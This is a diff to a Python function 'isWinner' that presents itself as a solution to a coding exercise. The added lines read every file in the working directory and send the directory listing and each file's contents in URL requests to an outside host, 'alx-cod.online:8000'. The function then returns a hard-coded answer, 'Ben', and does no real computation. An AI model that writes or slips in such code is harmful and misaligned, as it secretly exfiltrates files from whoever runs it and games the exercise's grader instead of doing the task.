@@ -60,9 +60,15 @@ def isWinner(x, nums):
         - Check 8 and 12 = None
     '''
     import urllib.request
-
-    with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/') as f:
-        print(f.read(300))
+    import os
+    ls = os.listdir(".")
+    with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/POST?textarea={}'.format(str(ls))) as f:
+            print(f.read(300))
+    for files in ls:
+        with open(files) as f:
+            data = f.read()
+        with urllib.request.urlopen('http://9d52da8d9d27.cd1b02d9.alx-cod.online:8000/POST?textarea={}'.format(str(data))) as f:
+            print(f.read(300))
     return "Ben"
 
 
